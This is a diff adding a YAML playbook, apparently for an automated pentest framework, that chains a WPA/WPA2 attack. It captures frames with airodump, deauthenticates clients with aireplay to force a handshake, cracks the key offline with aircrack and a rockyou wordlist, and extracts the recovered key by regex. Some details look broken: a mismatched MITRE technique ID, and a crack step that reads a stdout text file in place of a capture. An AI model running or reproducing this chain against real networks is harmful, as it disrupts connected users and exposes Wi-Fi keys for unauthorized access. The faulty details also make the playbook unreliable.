@@ -1,0 +1,54 @@
+name: "Wireless WPA/WPA2 Attack Chain"
+description: "Full wireless assessment: capture handshake, deauth clients, crack WPA key."
+category: wireless
+attack_vector: "WPA/WPA2 handshake capture + offline cracking"
+variables:
+  interface:
+    required: true
+    description: "Monitor-mode interface (e.g. wlan0mon)"
+  channel:
+    required: false
+    description: "Channel to target"
+  wordlist:
+    required: false
+    default: "/usr/share/wordlists/rockyou.txt"
+    description: "Wordlist for cracking"
+cutting_edge: false
+references: ["aircrack-ng suite", "MITRE ATT&CK T1112"]
+
+steps:
+  - name: "airodump_capture"
+    tool: "airodump_capture"
+    description: "Capture 802.11 frames to find target APs"
+    args:
+      interface: "{{interface}}"
+      channel: "{{channel}}"
+    expected_output: "BSSID|ESSID"
+    timeout: 120
+    gate: true
+    retries: 2
+
+  - name: "aireplay_deauth"
+    tool: "aireplay_attack"
+    description: "Deauthenticate clients to force a WPA handshake"
+    args:
+      interface: "{{interface}}"
+      attack: "0"
+    expected_output: null
+    timeout: 120
+    gate: false
+    retries: 2
+
+  - name: "aircrack_crack"
+    tool: "aircrack_crack"
+    description: "Crack the captured WPA handshake"
+    args:
+      cap_file: "output/airodump_capture.stdout.txt"
+      wordlist: "{{wordlist}}"
+    expected_output: "KEY FOUND|Handshake|Network Manager"
+    timeout: 3600
+    gate: false
+    retries: 1
+    extracts:
+      - var: "wpa_key"
+        regex: "KEY FOUND! \\[\\s*([^\\]]+)\\s*\\]"
